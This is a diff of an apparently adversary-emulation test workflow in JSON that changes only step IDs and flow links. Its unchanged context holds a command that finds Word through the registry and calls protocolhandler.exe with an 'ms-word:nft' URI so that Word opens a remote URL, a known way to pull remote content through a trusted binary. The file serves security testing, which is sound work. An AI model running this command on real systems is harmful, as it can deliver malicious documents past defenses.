@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "ff33b45c-3426-465b-98a7-67a08249edc0",
+      "id": "86422adb-e6b5-487b-97eb-7703b8fc977a",
       "type": "execute-command",
       "data": {
         "command": "FOR /F \"tokens=2*\" %a in ('reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\Winword.exe\" /V PATH') do set microsoft_wordpath=%b\ncall \"%microsoft_wordpath%\\protocolhandler.exe\" \"ms-word:nft|u|#{remote_url}\"",
@@ -16,7 +16,7 @@
       "elevation_required": false
     },
     {
-      "id": "e9470ede-c9e3-4a3f-aae0-3c32f8b11200",
+      "id": "053959ef-ec7e-41a9-aa48-f0305ac48452",
       "name": "Check dependency 1/1",
       "description": "Microsoft Word must be installed\n",
       "type": "execute-command",
@@ -27,7 +27,7 @@
       "elevation_required": false
     },
     {
-      "id": "b229751c-c9e4-40d5-9367-6b15d5f9e1de",
+      "id": "71fa1979-952b-444c-9229-d9834eff9722",
       "name": "Resolve dependency 1/1",
       "description": "Microsoft Word must be installed\n",
       "type": "execute-command",
@@ -38,7 +38,7 @@
       "elevation_required": false
     },
     {
-      "id": "659a5ccc-7cd2-45da-b770-edd8e74e0b46",
+      "id": "b1de2d47-a681-4a10-b0f8-a946974226ad",
       "name": "Re-check dependency 1/1",
       "description": "Microsoft Word must be installed\n",
       "type": "execute-command",
@@ -51,24 +51,24 @@
   ],
   "flows": [
     {
-      "s": "e9470ede-c9e3-4a3f-aae0-3c32f8b11200",
+      "s": "053959ef-ec7e-41a9-aa48-f0305ac48452",
       "p": "on-success",
-      "o": "ff33b45c-3426-465b-98a7-67a08249edc0"
+      "o": "86422adb-e6b5-487b-97eb-7703b8fc977a"
     },
     {
-      "s": "e9470ede-c9e3-4a3f-aae0-3c32f8b11200",
+      "s": "053959ef-ec7e-41a9-aa48-f0305ac48452",
       "p": "on-failure",
-      "o": "b229751c-c9e4-40d5-9367-6b15d5f9e1de"
+      "o": "71fa1979-952b-444c-9229-d9834eff9722"
     },
     {
-      "s": "b229751c-c9e4-40d5-9367-6b15d5f9e1de",
+      "s": "71fa1979-952b-444c-9229-d9834eff9722",
       "p": "on-success",
-      "o": "659a5ccc-7cd2-45da-b770-edd8e74e0b46"
+      "o": "b1de2d47-a681-4a10-b0f8-a946974226ad"
     },
     {
-      "s": "659a5ccc-7cd2-45da-b770-edd8e74e0b46",
+      "s": "b1de2d47-a681-4a10-b0f8-a946974226ad",
       "p": "on-failure",
-      "o": "ff33b45c-3426-465b-98a7-67a08249edc0"
+      "o": "86422adb-e6b5-487b-97eb-7703b8fc977a"
     }
   ],
   "tags": [
